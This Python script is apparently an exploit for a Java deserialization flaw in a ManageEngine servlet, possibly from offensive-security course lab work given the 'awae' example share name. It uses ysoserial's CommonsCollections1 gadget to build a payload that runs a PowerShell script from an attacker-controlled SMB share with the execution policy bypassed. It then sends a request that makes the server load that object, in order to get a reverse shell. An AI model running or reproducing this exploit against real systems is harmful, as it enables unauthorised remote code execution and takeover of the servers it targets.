import os
import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def gen_payload(ip, out_file, share):
	cmd = F"powershell.exe -executionpolicy bypass -file \\\\{ip}\\{share}\\test.ps1"
	os.system(F"java -jar ysoserial.jar CommonsCollections1 '{cmd}' > {out_file}")

def print_usage():
	print("Usage:")
	print(F"python {sys.argv[0]} <url> <local ip> <reverse shell port> <share name>")
	print(F"python {sys.argv[0]} https://manageengine:8443 192.168.124.139 4444 awae")

if len(sys.argv) != 5:
	print_usage()
	exit()

host = sys.argv[1]
smb_host = sys.argv[2]
reverse_shell_port = sys.argv[3]
share = sys.argv[4]
serialized_file = "test.obj"
local_share_location = F"./{share}"
gen_payload(smb_host, serialized_file, share)
path = F"/servlet/CustomFieldsFeedServlet?customFieldObject=\\\\{smb_host}\\{share}\\{serialized_file}"

req = host + path
res = requests.get(req, verify=False)
if res.status_code == 200:
	print("Waiting for shell")
else:
	print("Exploit failed")
	print(res.status_code)
	print(res.text)
